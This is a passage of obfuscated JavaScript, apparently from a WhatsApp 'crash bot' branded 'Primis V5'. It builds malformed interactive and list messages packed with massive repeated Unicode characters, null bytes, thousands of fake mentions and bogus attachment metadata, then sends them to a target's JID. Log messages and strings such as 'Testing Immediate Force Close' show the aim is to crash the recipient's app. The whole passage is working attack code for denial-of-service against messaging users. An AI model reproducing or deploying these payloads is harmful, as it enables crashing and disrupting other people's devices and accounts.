                    'gifPlayback': true,
                    'subtitle': "\0",
                    'hasMediaAttachment': true
                  },
                  'body': {
                    'text': "Primis 𝐂𝐫𝐚𝐬𝐡" + 'ꦾ'.repeat(0x1d4c0)
                  },
                  'footer': {
                    'text': "\0"
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "single_select",
                      'buttonParamsJson': JSON.stringify({
                        'title': '😂۞Primis😂',
                        'sections': []
                      })
                    }, {
                      'name': "single_select",
                      'buttonParamsJson': "{\"title\":\"" + "𑲭𑲭".repeat(0xea60) + "\",\"sections\":[{\"title\":\" i Primis be kill you \",\"rows\":[]}]}"
                    }, {
                      'name': 'call_permission_request',
                      'buttonParamsJson': '{}'
                    }, {
                      'name': 'mpm',
                      'buttonParamsJson': '{}'
                    }, {
                      'name': 'single_select',
                      'buttonParamsJson': "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                    }, {
                      'name': 'quick_reply',
                      'buttonParamsJson': "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"Developed\",\"url\":\"https://www.youtube.com/@tamainfinity\",\"merchant_url\":\"https://www.youtube.com/@tamainfinity\"}"
                    }, {
                      'name': "cta_call",
                      'buttonParamsJson': "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                    }, {
                      'name': 'cta_copy',
                      'buttonParamsJson': "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                    }, {
                      'name': "cta_reminder",
                      'buttonParamsJson': "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                    }, {
                      'name': "cta_cancel_reminder",
                      'buttonParamsJson': "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                    }, {
                      'name': "address_message",
                      'buttonParamsJson': "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                    }, {
                      'name': "send_location",
                      'buttonParamsJson': "\0"
                    }]
                  }
                }],
                'messageVersion': 0x1
              }
            }
          }
        }
      }, {
        'quoted': _0x51e776
      });
      await _0x35a9de.relayMessage(_0x1693d2, _0x1a5851.message, {
        'messageId': _0x1a5851.key.id
      });
      console.log("Succès\xA0! Bouton CRL envoyé");
    }
    async function _0x10574c(_0x2f874d) {
      let _0x54c46d = {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 0x2
            },
            'interactiveMessage': {
              'contextInfo': {
                'mentionedJid': ["13135550002@s.whatsapp.net"],
                'isForwarded': true,
                'forwardingScore': 0x3e7,
                'businessMessageForwardInfo': {
                  'businessOwnerJid': _0x2f874d
                },
                'dataSharingContext': {
                  'showMmDisclosure': true
                }
              },
              'body': {
                'title': '👑',
                'text': "⏤͟͟͞͞Primis-" + '᭄'.repeat(0x260d),
                'description': '💌',
                'footer': 'Primis⿻'
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "single_select",
                  'buttonParamsJson': ''
                }, {
                  'name': "view_product",
                  'buttonParamsJson': ''
                }, {
                  'name': 'payment_method',
                  'buttonParamsJson': ''
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': ''
                }, {
                  'name': "mpm",
                  'buttonParamsJson': ''
                }, {
                  'name': "payment_info",
                  'buttonParamsJson': ''
                }]
              }
            }
          }
        }
      };
      await _0x35a9de.relayMessage(_0x2f874d, _0x54c46d, {
        'participant': {
          'jid': _0x2f874d
        }
      });
      console.log("Succès\xA0! Bouton Crash envoyé");
    }
    async function _0xb0a89(_0x31ef20) {
      await _0x35a9de.relayMessage(_0x31ef20, {
        'viewOnceMessage': {
          'message': {
            'scheduledCallCreationMessage': {
              'callType': 'VIDEO',
              'scheduledTimestampMs': Date.now() + 0x260d,
              'title': " ⏤͟͟͞͞Primis" + "𑲭𑲭".repeat(0x186a0) + 'ꦾ'.repeat(0xc350),
              'inviteCode': "t.me/apex"
            }
          }
        }
      }, {});
    }
    async function _0x4131a6(_0x47f156) {
      try {
        let _0x4aa69f = {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 0x2
              },
              'interactiveMessage': {
                'contextInfo': {
                  'mentionedJid': [_0x47f156],
                  'isForwarded': true,
                  'forwardingScore': 0x3e7,
                  'businessMessageForwardInfo': {
                    'businessOwnerJid': _0x47f156
                  }
                },
                'body': {
                  'text': '⏤͟͟͞͞Primis⿻' + "\0".repeat(0xdbba0)
                },
                'nativeFlowMessage': {
                  'buttons': [{
                    'name': "single_select",
                    'buttonParamsJson': ''
                  }, {
                    'name': "call_permission_request",
                    'buttonParamsJson': ''
                  }, {
                    'name': 'mpm',
                    'buttonParamsJson': ''
                  }, {
                    'name': "mpm",
                    'buttonParamsJson': ''
                  }, {
                    'name': "mpm",
                    'buttonParamsJson': ''
                  }, {
                    'name': 'mpm',
                    'buttonParamsJson': ''
                  }]
                }
              }
            }
          }
        };
        await _0x35a9de.relayMessage(_0x47f156, _0x4aa69f, {
          'participant': {
            'jid': _0x47f156
          }
        });
      } catch (_0x303cf9) {
        console.log(_0x303cf9);
      }
    }
    async function _0x27aa51(_0x1c2f0c) {
      let _0x2a5a1b = [];
      for (let _0x4af38c = 0x0; _0x4af38c < 0x186a0; _0x4af38c++) {
        let _0x422d75 = {
          'title': "Super Deep Nested Section " + _0x4af38c,
          'highlight_label': "Extreme Highlight " + _0x4af38c,
          'rows': [{
            'title': "💎⃢ Primis ⃢↯🔥",
            'id': 'id' + _0x4af38c,
            'subrows': [{
              'title': "Nested row 1",
              'id': "nested_id1_" + _0x4af38c,
              'subsubrows': [{
                'title': "Deep Nested row 1",
                'id': "deep_nested_id1_" + _0x4af38c
              }, {
                'title': "Deep Nested row 2",
                'id': "deep_nested_id2_" + _0x4af38c
              }]
            }, {
              'title': "Nested row 2",
              'id': "nested_id2_" + _0x4af38c
            }]
          }]
        };
        _0x2a5a1b.push(_0x422d75);
      }
      let _0x58c6e8 = generateWAMessageFromContent(_0x1c2f0c, {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 0x2
            },
            'interactiveMessage': proto.Message.InteractiveMessage.create({
              'contextInfo': {
                'mentionedJid': [_0x1c2f0c],
                'isForwarded': true,
                'forwardingScore': 0x3e7,
                'businessMessageForwardInfo': {
                  'businessOwnerJid': _0x1c2f0c
                }
              },
              'body': proto.Message.InteractiveMessage.Body.create({
                'text': "💎⃢ Primis͡ ⃢↯🔥"
              }),
              'footer': proto.Message.InteractiveMessage.Footer.create({
                'buttonParamsJson': 'JSON.stringify(listMessage)'
              }),
              'header': proto.Message.InteractiveMessage.Header.create({
                'buttonParamsJson': "JSON.stringify(listMessage)",
                'subtitle': "Testing Immediate Force Close",
                'hasMediaAttachment': false
              }),
              'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                'buttons': [{
                  'name': "single_select",
                  'buttonParamsJson': "JSON.stringify(listMessage)"
                }, {
                  'name': "payment_method",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "single_select",
                  'buttonParamsJson': 'JSON.stringify(listMessage)'
                }, {
                  'name': "mpm",
                  'buttonParamsJson': "JSON.stringify(listMessage)"
                }, {
                  'name': "mpm",
                  'buttonParamsJson': "JSON.stringify(listMessage)"
                }, {
                  'name': 'mpm',
                  'buttonParamsJson': "JSON.stringify(listMessage)"
                }, {
                  'name': 'mpm',
                  'buttonParamsJson': '{}'
                }, {
                  'name': "mpm",
                  'buttonParamsJson': '{}'
                }, {
                  'name': 'mpm',
                  'buttonParamsJson': '{}'
                }, {
                  'name': "mpm",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "mpm",
                  'buttonParamsJson': '{}'
                }]
              })
            })
          }
        }
      }, {
        'userJid': _0x1c2f0c
      });
      await _0x35a9de.relayMessage(_0x1c2f0c, _0x58c6e8.message, {
        'participant': {
          'jid': _0x1c2f0c
        },
        'messageId': _0x58c6e8.key.id
      });
    }
    async function _0x358d0f(_0x1ca6e0) {
      let _0x4bdc97 = {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 0x2
            },
            'interactiveMessage': {
              'contextInfo': {
                'mentionedJid': ["13135550002@s.whastapp.net"],
                'isForwarded': true,
                'forwardingScore': 0x3e7,
                'businessMessageForwardInfo': {
                  'businessOwnerJid': _0x1ca6e0
                }
              },
              'body': {
                'text': "🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻"
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "single_select",
                  'buttonParamsJson': ''
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': ''
                }, {
                  'name': "mpm",
                  'buttonParamsJson': ''
                }, {
                  'name': 'mpm',
                  'buttonParamsJson': ''
                }, {
                  'name': "mpm",
                  'buttonParamsJson': ''
                }, {
                  'name': 'mpm',
                  'buttonParamsJson': ''
                }]
              }
            }
          }
        }
      };
      await _0x35a9de.relayMessage(_0x1ca6e0, _0x4bdc97, {
        'participant': {
          'jid': _0x1ca6e0
        }
      });
    }
    async function _0x29974a(_0x19c16a) {
      const _0x494052 = [{
        'attrs': {
          'biz_bot': '1'
        },
        'tag': "bot"
      }, {
        'attrs': {},
        'tag': 'biz'
      }];
      let _0x24abf6 = {
        'viewOnceMessage': {
          'message': {
            'listResponseMessage': {
              'title': "💎⃢ Primis⃢↯🔥" + 'ꦾ'.repeat(0x1194),
              'listType': 0x2,
              'singleSelectReply': {
                'selectedRowId': '🔪'
              },
              'contextInfo': {
                'stanzaId': _0x35a9de.generateMessageTag(),
                'participant': '0@s.whatsapp.net',
                'remoteJid': "status@broadcast",
                'mentionedJid': [_0x19c16a, "13135550002@s.whatsapp.net"],
                'quotedMessage': {
                  'buttonsMessage': {
                    'documentMessage': {
                      'url': "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                      'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      'fileSha256': "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                      'fileLength': "9999999999999",
                      'pageCount': 0xd4a50fff,
                      'mediaKey': "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                      'fileName': "💎⃢ Primis͜͡ ⃢↯🔥",
                      'fileEncSha256': 'K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=',
                      'directPath': "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                      'mediaKeyTimestamp': "1735456100",
                      'contactVcard': true,
                      'caption': "Primis Die ? Huh !"
                    },
                    'contentText': "I Primis Die With You \"😮‍💨\"",
                    'footerText': "© Primis",
                    'buttons': [{
                      'buttonId': "\0".repeat(0xcf850),
                      'buttonText': {
                        'displayText': "⏤͟͟͞͞Primis⿻"
                      },
                      'type': 0x1
                    }],
                    'headerType': 0x3
                  }
                },
                'conversionSource': "porn",
                'conversionDelaySeconds': 0x270f,
                'forwardingScore': 0xf423f,
                'isForwarded': true,
                'quotedAd': {
                  'advertiserName': " x ",
                  'mediaType': "IMAGE",
                  'caption': " x "
                },
                'placeholderKey': {
                  'remoteJid': "0@s.whatsapp.net",
                  'fromMe': false,
                  'id': "ABCDEF1234567890"
                },
                'expiration': -0x1869f,
                'ephemeralSettingTimestamp': Date.now(),
                'entryPointConversionSource': "wangcap",
                'entryPointConversionApp': "wangcap",
                'actionLink': {
                  'url': "t.me/dsprimis",
                  'buttonTitle': "trash"
                },
                'disappearingMode': {
                  'initiator': 0x1,
                  'trigger': 0x2,
                  'initiatorDeviceJid': _0x19c16a,
                  'initiatedByMe': true
                },
                'groupSubject': "Mahiru",
                'parentGroupJid': "combine",
                'trustBannerType': "unexpected",
                'trustBannerAction': 0x1869f,
                'isSampled': true,
                'externalAdReply': {
                  'title': "𑲭𑲭 Primis ~ \"Ds\" ⚔️ ",
                  'mediaType': 0x2,
                  'renderLargerThumbnail': false,
                  'showAdAttribution': false,
                  'containsAutoReply': false,
                  'body': "© Agler Forger",
                  'sourceUrl': "se me?",
                  'sourceId': "Agler Forger",
                  'ctwaClid': 'cta',
                  'ref': "ref",
                  'clickToWhatsappCall': true,
                  'automatedGreetingMessageShown': false,
                  'greetingMessageBody': "burst",
                  'ctaPayload': "cta",
                  'disableNudge': true,
                  'originalImageUrl': "trash"
                },
                'featureEligibilities': {
                  'cannotBeReactedTo': true,
                  'cannotBeRanked': true,
                  'canRequestFeedback': true
                },
                'forwardedNewsletterMessageInfo': {
                  'newsletterJid': "120363415983819549@newsletter",
                  'serverMessageId': 0x1,
                  'newsletterName': "Crash Sletter ~ " + "ꥈꥈꥈꥈꥈꥈ".repeat(0xa),
                  'contentType': 0x3,
                  'accessibilityText': "crash"
                },
                'statusAttributionType': 0x2,
                'utm': {
                  'utmSource': 'utm',
                  'utmCampaign': 'utm2'
                }
              },
              'description': 'INITIATED_BY_USER'
            },
            'messageContextInfo': {
              'supportPayload': JSON.stringify({
                'version': 0x2,
                'is_ai_message': true,
                'should_show_system_message': true
              })
            }
          }
        }
      };
      await _0x35a9de.relayMessage(_0x19c16a, _0x24abf6, {
        'additionalNodes': _0x494052,
        'participant': {
          'jid': _0x19c16a
        }
      });
      console.log('');
    }
    async function _0x28a9fc(_0x588737, _0x34f403 = true) {
      _0x35a9de.relayMessage(_0x588737, {
        'extendedTextMessage': {
          'text': "𑲭𑲭💎⃢ Primis⿻↯🔥 " + 'ꦾ'.repeat(0x19258) + " " + "@13135550002".repeat(0x61a8),
          'contextInfo': {
            'mentionedJid': ["13135550002@s.whatsapp.net", ...Array.from({
              'length': 0x3a98
            }, () => "13135550002" + Math.floor(Math.random() * 0x7a120) + '@s.whatsapp.net')],
            'stanzaId': "1234567890ABCDEF",
            'participant': '13135550002@s.whatsapp.net',
            'quotedMessage': {
              'callLogMesssage': {
                'isVideo': true,
                'callOutcome': '1',
                'durationSecs': '0',
                'callType': "REGULAR",
                'participants': [{
                  'jid': "13135550002@s.whatsapp.net",
                  'callOutcome': '1'
                }]
              }
            },
            'remoteJid': '13135550002@s.whastapp.net',
            'conversionSource': "source_example",
            'conversionData': "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
            'conversionDelaySeconds': 0xa,
            'forwardingScore': 0x5f5e0ff,
            'isForwarded': true,
            'quotedAd': {
              'advertiserName': "Example Advertiser",
              'mediaType': "IMAGE",
              'caption': "This is an ad caption"
            },
            'placeholderKey': {
              'remoteJid': "13135550002@s.whatsapp.net",
              'fromMe': false,
              'id': 'ABCDEF1234567890'
            },
            'expiration': 0x15180,
            'ephemeralSettingTimestamp': "1728090592378",
            'ephemeralSharedSecret': 'ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==',
            'externalAdReply': {
              'title': "💎⃢ ⏤͟͟͞͞Primis⿻ ⃢↯🔥",
              'body': "Ai To Crash " + "\0".repeat(0xc8),
              'mediaType': 'VIDEO',
              'renderLargerThumbnail': true,
              'previewType': 'VIDEO',
              'sourceType': 'x',
              'sourceId': 'x',
              'sourceUrl': 'https://www.facebook.com/WhastApp',
              'mediaUrl': 'https://www.facebook.com/WhastApp',
              'containsAutoReply': true,
              'showAdAttribution': true,
              'ctwaClid': "ctwa_clid_example",
              'ref': 'ref_example'
            },
            'entryPointConversionSource': "entry_point_source_example",
            'entryPointConversionApp': 'entry_point_app_example',
            'entryPointConversionDelaySeconds': 0x5,
            'disappearingMode': {},
            'actionLink': {
              'url': 'https://www.facebook.com/WhatsApp'
            },
            'groupSubject': "Example Group Subject",
            'parentGroupJid': "13135550002@g.us",
            'trustBannerType': 'trust_banner_example',
            'trustBannerAction': 0x1,
            'isSampled': false,
            'utm': {
              'utmSource': 'utm_source_example',
              'utmCampaign': "utm_campaign_example"
            },
            'forwardedNewsletterMessageInfo': {
              'newsletterJid': "13135550002@newsletter",
              'serverMessageId': 0x1,
              'newsletterName': "Meta Ai",
              'contentType': "UPDATE",
              'accessibilityText': "Meta Ai"
            },
            'businessMessageForwardInfo': {
              'businessOwnerJid': "13135550002@s.whatsapp.net"
            },
            'smbriyuCampaignId': "smb_riyu_campaign_id_example",
            'smbServerCampaignId': "smb_server_campaign_id_example",
            'dataSharingContext': {
              'showMmDisclosure': true
            }
          }
        }
      }, _0x34f403 ? {
        'participant': {
          'jid': _0x588737
        }
      } : {});
      console.log('');
    }
    async function _0x5c64a0(_0x17fbf3, _0x5b4406 = true) {
      const _0x36c080 = [{
        'attrs': {
          'biz_bot': '1'
        },
        'tag': "bot"
      }, {
        'attrs': {},
        'tag': 'biz'
      }];
      let _0x4e0f76 = {
        'viewOnceMessage': {
          'message': {
            'listResponseMessage': {
              'title': "💎⃢ Primis⿻ ⃢↯🔥" + 'ꦽ'.repeat(0x4267),
              'listType': 0x2,
              'singleSelectReply': {
                'selectedRowId': '🎭'
              },
              'contextInfo': {
                'virtexId': _0x35a9de.generateMessageTag(),
                'participant': "13135550002@s.whatsapp.net",
                'mentionedJid': ["13135550002@s.whatsapp.net"],
                'quotedMessage': {
                  'buttonsMessage': {
                    'documentMessage': {
                      'url': 'https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true',
                      'mimetype': 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                      'fileSha256': "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      'fileLength': '9999999999999',
                      'pageCount': 0x4e729fff,
                      'mediaKey': "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                      'fileName': "⏤͟͟͞͞Primis V5⿻" + "\0".repeat(0x17dea),
                      'fileEncSha256': 'LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=',
                      'directPath': "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                      'mediaKeyTimestamp': "1726867151",
                      'contactVcard': true
                    },
                    'hasMediaAttachment': true,
                    'contentText': "Hallo\"",
                    'footerText': "💎⃢ Primis ⃢↯🔥",
                    'buttons': [{
                      'buttonId': "\0".repeat(0x29810),
                      'buttonText': {
                        'displayText': "⏤͟͟͞͞Primis⿻" + "\0".repeat(0x7cf)
                      },
                      'type': 0x1
                    }, {
                      'buttonId': "\0".repeat(0x35b60),
                      'buttonText': {
                        'displayText': "⏤͟͟͞͞Primis⿻" + "\0".repeat(0x7cf)
                      },
                      'type': 0x1
                    }, {
                      'buttonId': "\0".repeat(0x35b60),
                      'buttonText': {
                        'displayText': "Primis" + "\0".repeat(0x7cf)
                      },
                      'type': 0x1
                    }],
                    'viewOnce': true,
                    'headerType': 0x3
                  }
                },
                'conversionSource': "porn",
                'conversionDelaySeconds': 0x270f,
                'forwardingScore': 0xf423f,
                'isForwarded': true,
                'quotedAd': {
                  'advertiserName': " x ",
                  'mediaType': "IMAGE",
                  'caption': " x "
                },
                'placeholderKey': {
                  'remoteJid': '13135550002@s.whatsapp.net',
                  'fromMe': false,
                  'id': 'ABCDEF1234567890'
                },
                'expiration': -0x1869f,
                'ephemeralSettingTimestamp': Date.now(),
                'entryPointConversionSource': '❤️',
                'entryPointConversionApp': '💛',
                'actionLink': {
                  'url': "t.me/dsprimis",
                  'buttonTitle': "💎⃢ Primis͜͡ ⃢↯🔥"
                },
                'disappearingMode': {
                  'initiator': 0x1,
                  'trigger': 0x2,
                  'initiatorDeviceJid': _0x17fbf3,
                  'initiatedByMe': true
                },
                'groupSubject': '😼',
                'parentGroupJid': '😽',
                'trustBannerType': '😾',
                'trustBannerAction': 0x1869f,
                'isSampled': true,
                'externalAdReply': {},
                'featureEligibilities': {
                  'cannotBeReactedTo': true,
                  'cannotBeRanked': true,
                  'canRequestFeedback': true
                },
                'forwardedNewsletterMessageInfo': {
                  'newsletterJid': "120363415983819549@newsletter",
                  'serverMessageId': 0x1,
                  'newsletterName': '@13135550002' + "ꥈꥈꥈꥈꥈꥈ".repeat(0xa),
                  'contentType': 0x3,
                  'accessibilityText': "kontol"
                },
                'statusAttributionType': 0x2,
                'utm': {
                  'utmSource': "utm",
                  'utmCampaign': "utm2"
                }
              },
              'description': '@13135550002'.repeat(0xbb7)
            },
            'messageContextInfo': {
              'supportPayload': JSON.stringify({
                'version': 0x2,
                'is_ai_message': true,
                'should_show_system_message': true
              })
            }
          }
        }
      };
      let _0x5e3c60 = [];
      for (let _0x2b527a = 0x0; _0x2b527a < 0x1; _0x2b527a++) {
        let _0x22ae28 = "\0".repeat(0x2edf);
        let _0x4a6086 = {
          'title': "Section " + (_0x2b527a + 0x1),
          'highlight_label': "Highlight " + (_0x2b527a + 0x1),
          'rows': [{
            'title': _0x22ae28,
            'id': "\0".repeat(0x3e7),
            'subrows': [{
              'title': "\0".repeat(0x3e7),
              'id': "\0".repeat(0x3e7),
              'subsubrows': [{
                'title': "\0".repeat(0x3e7),
                'id': "\0".repeat(0x3e7)
              }, {
                'title': "\0".repeat(0x3e7),
                'id': "\0".repeat(0x3e7)
              }]
            }, {
              'title': "\0".repeat(0x3e7),
              'id': "\0".repeat(0x3e7)
            }]
          }]
        };
        _0x5e3c60.push(_0x4a6086);
      }
      let _0x15e4a8 = {
        'title': "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
        'sections': _0x5e3c60
      };
      let _0x46d666 = generateWAMessageFromContent(_0x17fbf3, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 0x2
            },
            'interactiveMessage': proto.Message.InteractiveMessage.create({
              'contextInfo': {
                'participant': "0@s.whatsapp.net",
                'remoteJid': "status@broadcast",
                'mentionedJid': [_0x17fbf3],
                'isForwarded': true,
                'forwardingScore': 0x3e7
              },
              'body': proto.Message.InteractiveMessage.Body.create({
                'text': "💎⃢ Primis↯🔥" + 'ꦽ'.repeat(0x752f)
              }),
              'footer': proto.Message.InteractiveMessage.Footer.create({
                'buttonParamsJson': JSON.stringify(_0x15e4a8)
              }),
              'header': proto.Message.InteractiveMessage.Header.create({
                'buttonParamsJson': JSON.stringify(_0x15e4a8),
                'subtitle': "💎⃢ PrimIs͜͡͡'͡⃢↯🔥" + "\0".repeat(0x270f),
                'hasMediaAttachment': false
              }),
              'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                'buttons': [{
                  'name': "single_select",
                  'buttonParamsJson': "JSON.stringify(listMessage)"
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': '{}'
                }, {
                  'name': "single_select",
                  'buttonParamsJson': 'JSON.stringify(listMessage)'
                }]
              })
            })
          }
        }
      }), {
        'userJid': _0x17fbf3
      });
      await _0x35a9de.relayMessage(_0x17fbf3, _0x46d666.message, {
        'messageId': _0x46d666.key.id,
        'participant': {
          'jid': _0x17fbf3
        }
      });
      console.log('');
      await _0x35a9de.relayMessage(_0x17fbf3, _0x46d666.message, {
        'messageId': _0x46d666.key.id,
        'participant': {
          'jid': _0x17fbf3
        }
      });
      await _0x35a9de.relayMessage(_0x17fbf3, _0x4e0f76, {
        'additionalNodes': _0x36c080,
        'participant': {
          'jid': _0x17fbf3
        }
      });
      console.log('');
    }
    async function _0x44bef6(_0x3c964e, _0x36f1d7 = true) {
      let _0x5e90a6 = await generateWAMessageFromContent(_0x3c964e, {
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': "💎⃢ Primis ⃢↯🔥",
                'hasMediaAttachment': false
              },
              'body': {
                'text': "Crasher"
              },
              'nativeFlowMessage': {
                'messageParamsJson': '',
                'buttons': [{
                  'name': "single_select",
                  'buttonParamsJson': 'z'
                }, {
                  'name': "call_permission_request",
                  'buttonParamsJson': '{}'
                }]
              }
            }
          }
        }
      }, {});
      await _0x35a9de.relayMessage(_0x3c964e, _0x5e90a6.message, {
        'messageId': _0x5e90a6.key.id,
        'participant': {
          'jid': _0x3c964e
        }
      });
    }
    async function _0x1dbdcf(_0x348098) {
      await _0x35a9de.relayMessage(_0x348098, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'locationMessage': {
                  'degreesLatitude': -999.035,
                  'degreesLongitude': 999.035
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': '' + 'ꦾ'.repeat(0xc350) + '@X'.repeat(0x15f90) + "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(0x15f90) + 'ᬃᬃ'.repeat(0x15f90) + '⿻'.repeat(0x15f90)
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x5
                }, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': '1@newsletter',
                  'groupSubject': "⏤͟͟͞͞Primis V5⿻`"
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': _0x348098
        }
      });
    }
    ;
    async function _0xd2ecf2(_0x4e0c52, _0x3d25ed = false) {
      await _0x35a9de.relayMessage(_0x4e0c52, {
        'extendedTextMessage': {
          'text': "`🐉 𝐏𝐫𝐢𝐦𝐢𝐬 𝐕5⿻`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + 'ી'.repeat(0xd6d8),
          'contextInfo': {
            'mentionedJid': ["62895329013688@s.whatsapp.net", ...Array.from({
              'length': 0x3a98
            }, () => '1' + Math.floor(Math.random() * 0xea60) + "@s.whatsapp.net")],
            'stanzaId': "1234567890ABCDEF",
            'participant': "62895329013688@s.whatsapp.net",
            'quotedMessage': {
              'callLogMesssage': {
                'isVideo': false,
                'callOutcome': '5',
                'durationSecs': '999',
                'callType': "REGULAR",
                'participants': [{
                  'jid': '62895329013688@s.whatsapp.net',
                  'callOutcome': '5'
                }]
              }
            },
            'remoteJid': _0x4e0c52,
            'conversionSource': " X ",
            'conversionData': '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=',
            'conversionDelaySeconds': 0xa,
